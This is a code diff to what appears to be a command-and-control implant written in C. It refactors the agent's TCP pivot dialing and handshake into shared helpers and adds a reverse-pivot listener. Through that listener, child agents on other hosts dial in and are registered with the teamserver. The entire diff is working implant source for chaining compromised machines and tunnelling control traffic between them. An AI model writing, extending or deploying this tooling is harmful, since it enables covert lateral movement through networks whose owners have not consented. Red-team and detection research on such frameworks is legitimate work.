@@ -32,9 +32,8 @@
 // EINPROGRESS for non-blocking connect
 #define EINPROGRESS  115
 
-// Connect timeout (seconds)
-#define PIVOT_CONNECT_TIMEOUT  10
-
+// Connect timeout (PIVOT_CONNECT_TIMEOUT) is defined in pivot.h: main.c's
+// reverse-pivot bootstrap dials with the same bound, so the value is shared.
 // For pselect fd_set (up to 1024 fds)
 typedef struct {
     unsigned long fds_bits[1024 / (8 * sizeof(unsigned long))];
@@ -57,6 +56,8 @@ pivot_context_t g_pivot_ctx;
 
 void pivots_init(pivot_context_t *ctx) {
     ax_memset(ctx, 0, sizeof(pivot_context_t));
+    /* 0 is a valid descriptor (stdin), so the "not listening" sentinel is -1. */
+    ctx->listen_fd = -1;
 }
 
 /// Parse "host:port" into ip (network byte order) and port (host order)
@@ -156,6 +157,124 @@ static int pivot_send_msg(int fd, const uint8_t *data, uint32_t data_len) {
 
 // ── Link TCP ──
 
+/// Dial a TCP peer with a bounded connect timeout.
+///
+/// Returns a *blocking* connected fd on success, -1 on failure.  On failure
+/// *err_out (when non-NULL) is pointed at a static reason string so callers
+/// can keep reporting the same messages they always did.
+///
+/// Shared by the forward pivot (parent dials the child) and the reverse
+/// pivot's child-side bootstrap (child dials the parent) -- it is the same
+/// non-blocking connect + pselect6 + SO_ERROR dance, implemented once.
+int pivot_dial_tcp(const char *address, int port, int timeout_s, const char **err_out) {
+    uint32_t ip;
+    uint16_t net_port;
+    if (pivot_parse_addr(address, port, &ip, &net_port) != 0) {
+        if (err_out) *err_out = "Invalid address";
+        return -1;
+    }
+
+    int fd = (int)sys_socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+    if (fd < 0) {
+        if (err_out) *err_out = "Socket creation failed";
+        return -1;
+    }
+
+    struct pivot_sockaddr_in addr;
+    ax_memset(&addr, 0, sizeof(addr));
+    addr.sin_family = AF_INET;
+    addr.sin_port = net_port;
+    addr.sin_addr = ip;
+
+    // Set non-blocking for connect timeout
+    long orig_flags = sys_fcntl(fd, F_GETFL, 0);
+    sys_fcntl(fd, F_SETFL, orig_flags | O_NONBLOCK);
+
+    int conn_ret = sys_connect(fd, &addr, sizeof(addr));
+    if (conn_ret != 0 && conn_ret != -EINPROGRESS) {
+        sys_close(fd);
+        if (err_out) *err_out = "Connection refused";
+        return -1;
+    }
+
+    if (conn_ret == -EINPROGRESS) {
+        // Wait for connection with timeout using pselect6
+        linux_fd_set writefds;
+        FD_ZERO(&writefds);
+        FD_SET(fd, &writefds);
+
+        struct linux_timespec conn_timeout = { .tv_sec = timeout_s, .tv_nsec = 0 };
+        int ready = sys_pselect6(fd + 1, (void *)0, &writefds, (void *)0, &conn_timeout, (void *)0);
+
+        if (ready <= 0) {
+            sys_close(fd);
+            if (err_out) *err_out = "Connection timed out";
+            return -1;
+        }
+
+        // Check SO_ERROR to verify connection succeeded
+        int sock_err = 0;
+        unsigned int err_len = sizeof(sock_err);
+        sys_getsockopt(fd, SOL_SOCKET, SO_ERROR, &sock_err, &err_len);
+        if (sock_err != 0) {
+            sys_close(fd);
+            if (err_out) *err_out = "Connection refused";
+            return -1;
+        }
+    }
+
+    // Restore blocking mode for subsequent read/write
+    sys_fcntl(fd, F_SETFL, orig_flags);
+    return fd;
+}
+
+/// Adopt an already-connected child socket as a pivot entry.
+///
+/// Shared by both directions: pivot_link_tcp() hands it a fd it dialed, the
+/// reverse/listen path hands it a fd it accepted.  The child speaks first in
+/// both cases, so the handshake read is identical.
+///
+/// pivot_id == 0 means "derive it from the child's watermark" -- a reverse
+/// pivot has no originating task id, and both sides compute the id the same
+/// way (the teamserver takes it from AnsLink.Watermark).
+///
+/// On success returns 0 and stores the pivot id in *out_id (when non-NULL).
+/// On failure the fd is closed, an error is written to `response`, and -1 is
+/// returned.
+static int pivot_adopt_fd(pivot_context_t *ctx, int slot, uint32_t pivot_id,
+                          int fd, mp_writer_t *response, uint32_t *out_id) {
+    // The child sends its init message as [4B BE length][encrypted_data].
+    // The encrypted_data contains the watermark (first 4 bytes) + beat.
+    uint32_t beat_len = 0;
+    uint8_t *beat_data = pivot_recv_msg(fd, &beat_len);
+    if (!beat_data || beat_len < 4) {
+        if (beat_data) ax_free(beat_data);
+        sys_close(fd);
+        mp_write_map(response, 1);
+        mp_write_kv_str(response, "error", "Handshake failed");
+        return -1;
+    }
+
+    uint32_t watermark = ((uint32_t)beat_data[0] << 24) | ((uint32_t)beat_data[1] << 16) |
+                         ((uint32_t)beat_data[2] << 8) | beat_data[3];
+    if (pivot_id == 0) pivot_id = watermark;
+
+    ctx->entries[slot].id = pivot_id;
+    ctx->entries[slot].fd = fd;
+    ctx->entries[slot].active = 1;
+    ctx->count++;
+
+    // Response: {type: PIVOT_TYPE_TCP, watermark: uint32, beat: bytes}
+    mp_write_map(response, 3);
+    mp_write_kv_uint(response, "type", PIVOT_TYPE_TCP);
+    mp_write_kv_uint(response, "watermark", watermark);
+    mp_write_kv_bin(response, "beat", beat_data + 4, beat_len - 4);
+
+    ax_free(beat_data);
+    if (out_id) *out_id = pivot_id;
+    return 0;
+}
+
 int pivot_link_tcp(pivot_context_t *ctx, uint32_t task_id,
                    const char *address, int port,
                    mp_writer_t *response) {
@@ -173,104 +292,17 @@ int pivot_link_tcp(pivot_context_t *ctx, uint32_t task_id,
         return -1;
     }
 
-    // Parse address
-    uint32_t ip;
-    uint16_t net_port;
-    if (pivot_parse_addr(address, port, &ip, &net_port) != 0) {
-        mp_write_map(response, 1);
-        mp_write_kv_str(response, "error", "Invalid address");
-        return -1;
-    }
-
-    // Create socket + non-blocking connect with timeout
-    int fd = sys_socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+    const char *dial_err = (const char *)0;
+    int fd = pivot_dial_tcp(address, port, PIVOT_CONNECT_TIMEOUT, &dial_err);
     if (fd < 0) {
         mp_write_map(response, 1);
-        mp_write_kv_str(response, "error", "Socket creation failed");
+        mp_write_kv_str(response, "error", dial_err ? dial_err : "Connection failed");
         return -1;
     }
 
-    struct pivot_sockaddr_in addr;
-    ax_memset(&addr, 0, sizeof(addr));
-    addr.sin_family = AF_INET;
-    addr.sin_port = net_port;
-    addr.sin_addr = ip;
-
-    // Set non-blocking for connect timeout
-    long orig_flags = sys_fcntl(fd, F_GETFL, 0);
-    sys_fcntl(fd, F_SETFL, orig_flags | O_NONBLOCK);
-
-    int conn_ret = sys_connect(fd, &addr, sizeof(addr));
-    if (conn_ret != 0 && conn_ret != -EINPROGRESS) {
-        sys_close(fd);
-        mp_write_map(response, 1);
-        mp_write_kv_str(response, "error", "Connection refused");
-        return -1;
-    }
-
-    if (conn_ret == -EINPROGRESS) {
-        // Wait for connection with timeout using pselect6
-        linux_fd_set writefds;
-        FD_ZERO(&writefds);
-        FD_SET(fd, &writefds);
-
-        struct linux_timespec conn_timeout = { .tv_sec = PIVOT_CONNECT_TIMEOUT, .tv_nsec = 0 };
-        int ready = sys_pselect6(fd + 1, (void *)0, &writefds, (void *)0, &conn_timeout, (void *)0);
-
-        if (ready <= 0) {
-            sys_close(fd);
-            mp_write_map(response, 1);
-            mp_write_kv_str(response, "error", "Connection timed out");
-            return -1;
-        }
-
-        // Check SO_ERROR to verify connection succeeded
-        int sock_err = 0;
-        unsigned int err_len = sizeof(sock_err);
-        sys_getsockopt(fd, SOL_SOCKET, SO_ERROR, &sock_err, &err_len);
-        if (sock_err != 0) {
-            sys_close(fd);
-            mp_write_map(response, 1);
-            mp_write_kv_str(response, "error", "Connection refused");
-            return -1;
-        }
-    }
-
-    // Restore blocking mode for subsequent read/write
-    sys_fcntl(fd, F_SETFL, orig_flags);
-
-    // Read handshake from child agent:
-    // The child sends its init message as [4B BE length][encrypted_data]
-    // The encrypted_data contains the watermark (first 4 bytes) + beat
-    // We need to read the full message and pass it back to the teamserver
-    uint32_t beat_len = 0;
-    uint8_t *beat_data = pivot_recv_msg(fd, &beat_len);
-    if (!beat_data || beat_len < 4) {
-        if (beat_data) ax_free(beat_data);
-        sys_close(fd);
-        mp_write_map(response, 1);
-        mp_write_kv_str(response, "error", "Handshake failed");
-        return -1;
-    }
-
-    // Store pivot
-    ctx->entries[slot].id = task_id;
-    ctx->entries[slot].fd = fd;
-    ctx->entries[slot].active = 1;
-    ctx->count++;
-
-    // Build response: {type: PIVOT_TYPE_TCP, watermark: uint32, beat: bytes}
-    // The watermark is the first 4 bytes of the beat data (agent's watermark)
-    uint32_t watermark = ((uint32_t)beat_data[0] << 24) | ((uint32_t)beat_data[1] << 16) |
-                         ((uint32_t)beat_data[2] << 8) | beat_data[3];
-
-    mp_write_map(response, 3);
-    mp_write_kv_uint(response, "type", PIVOT_TYPE_TCP);
-    mp_write_kv_uint(response, "watermark", watermark);
-    mp_write_kv_bin(response, "beat", beat_data + 4, beat_len - 4);
-
-    ax_free(beat_data);
-    return 0;
+    // Read the child's handshake and register the pivot.  Shared verbatim
+    // with the reverse/listen path (pivot_adopt_fd).
+    return pivot_adopt_fd(ctx, slot, task_id, fd, response, (uint32_t *)0);
 }
 
 // ── Unlink ──
@@ -311,12 +343,114 @@ int pivot_write(pivot_context_t *ctx, uint32_t pivot_id,
     return -1;
 }
 
+// ── Reverse pivot: listen side ──
+
+int pivot_listen_tcp(pivot_context_t *ctx, int port, mp_writer_t *response) {
+    // port == 0 -> stop listening (lets the operator close the window again)
+    if (port <= 0) {
+        if (ctx->listen_fd >= 0) {
+            sys_close(ctx->listen_fd);
+            ctx->listen_fd = -1;
+            ctx->listen_port = 0;
+        }
+        mp_write_map(response, 2);
+        mp_write_kv_str(response, "status", "stopped");
+        mp_write_kv_uint(response, "port", 0);
+        return 0;
+    }
+
+    // Re-listening replaces the previous listener (idempotent).
+    if (ctx->listen_fd >= 0) {
+        sys_close(ctx->listen_fd);
+        ctx->listen_fd = -1;
+    }
+
+    connector_t server;
+    if (conn_bind_listen(&server, (uint16_t)port) != 0) {
+        mp_write_map(response, 1);
+        mp_write_kv_str(response, "error", "Listen failed");
+        return -1;
+    }
+
+    // Non-blocking: process_pivots() polls it, so the agent's command loop is
+    // never stalled waiting for a child that may never dial in.
+    long flags = sys_fcntl(server.fd, F_GETFL, 0);
+    if (flags >= 0) sys_fcntl(server.fd, F_SETFL, flags | O_NONBLOCK);
+
+    ctx->listen_fd = server.fd;
+    ctx->listen_port = (uint16_t)port;
+
+    mp_write_map(response, 2);
+    mp_write_kv_str(response, "status", "listening");
+    mp_write_kv_uint(response, "port", (uint64_t)port);
+    return 0;
+}
+
+/// Poll the listener and adopt one child that dialed in.
+///
+/// The announcement is emitted as an asynchronous COMMAND_LINK object with
+/// id: 0 -- the same convention the auto-disconnect COMMAND_UNLINK below uses,
+/// so the teamserver reads the pivot id out of the payload (the child's
+/// watermark) instead of a task id, and reuses its existing COMMAND_LINK
+/// handler verbatim.
+///
+/// Returns the number of objects appended (0 or 1).
+static int pivot_accept_pending(pivot_context_t *ctx, mp_writer_t *objects_writer) {
+    if (ctx->listen_fd < 0) return 0;
+
+    linux_fd_set readfds;
+    FD_ZERO(&readfds);
+    FD_SET(ctx->listen_fd, &readfds);
+
+    struct linux_timespec timeout = { .tv_sec = 0, .tv_nsec = 0 };
+    int ready = sys_pselect6(ctx->listen_fd + 1, &readfds, (void *)0, (void *)0, &timeout, (void *)0);
+    if (ready <= 0 || !FD_ISSET(ctx->listen_fd, &readfds)) return 0;
+
+    connector_t server;
+    ax_memset(&server, 0, sizeof(server));
+    server.fd = ctx->listen_fd;
+
+    connector_t conn;
+    if (conn_accept(&conn, &server) != 0) return 0;   // spurious wakeup
+
+    int slot = -1;
+    for (int i = 0; i < MAX_PIVOTS; i++) {
+        if (!ctx->entries[i].active) { slot = i; break; }
+    }
+    if (slot < 0) {
+        conn_close(&conn);
+        return 0;
+    }
+
+    mp_writer_t rsp;
+    mp_writer_init(&rsp, 128);
+    uint32_t pivot_id = 0;
+    if (pivot_adopt_fd(ctx, slot, 0, conn.fd, &rsp, &pivot_id) != 0) {
+        mp_writer_free(&rsp);   // pivot_adopt_fd already closed the socket
+        return 0;
+    }
+
+    mp_writer_t cmd;
+    mp_writer_init(&cmd, 128);
+    mp_write_map(&cmd, 3);
+    mp_write_kv_uint(&cmd, "code", COMMAND_LINK);
+    mp_write_kv_uint(&cmd, "id", 0);
+    mp_write_kv_bin(&cmd, "data", rsp.buf.data, (uint32_t)rsp.buf.len);
+    mp_write_bin(objects_writer, cmd.buf.data, (uint32_t)cmd.buf.len);
+    mp_writer_free(&cmd);
+    mp_writer_free(&rsp);
+    return 1;
+}
+
 // ── Process pivots (poll child sockets for incoming data) ──
 
 int process_pivots(pivot_context_t *ctx, mp_writer_t *objects_writer) {
-    if (ctx->count == 0) return 0;
+    // NB: an open listener counts even with no pivots yet -- that is exactly
+    // the state we sit in while waiting for the first child to dial in.
+    if (ctx->count == 0 && ctx->listen_fd < 0) return 0;
 
     int appended = 0;
+    appended += pivot_accept_pending(ctx, objects_writer);
 
     for (int i = 0; i < MAX_PIVOTS; i++) {
         if (!ctx->entries[i].active) continue;
